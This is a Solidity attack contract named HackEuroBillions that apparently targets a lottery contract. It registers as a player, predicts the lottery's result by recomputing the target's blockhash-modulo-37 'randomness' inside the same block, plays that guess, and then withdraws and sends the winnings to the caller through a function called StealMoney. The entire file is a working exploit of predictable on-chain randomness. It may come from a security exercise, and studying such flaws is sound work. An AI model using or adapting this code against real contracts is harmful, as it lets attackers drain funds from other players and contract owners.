pragma solidity ^0.4.0;

import "./EuroBillions.sol";

contract HackEuroBillions {
    // Instance of the real contract.
    EuroBillions _euroBillions;

    constructor(address contractAddress) public {
        _euroBillions = EuroBillions(contractAddress);
    }

    // Smart contract should register (instead of user).
    function register(string memory pseudo) public payable {
        _euroBillions.register.value(msg.value)(pseudo);
    }
       
    function CheatPlay(uint playerBet) public {
        // Mimic original contract "randomness".
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint guessedNumber = (blockValue % 37);

        // This call will be mined in same block!
        _euroBillions.play(playerBet, guessedNumber);
    }

    function StealMoney(uint value) public {
        _euroBillions.userWithdraw(value);
        msg.sender.transfer(value);
    }

    function () public payable {
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}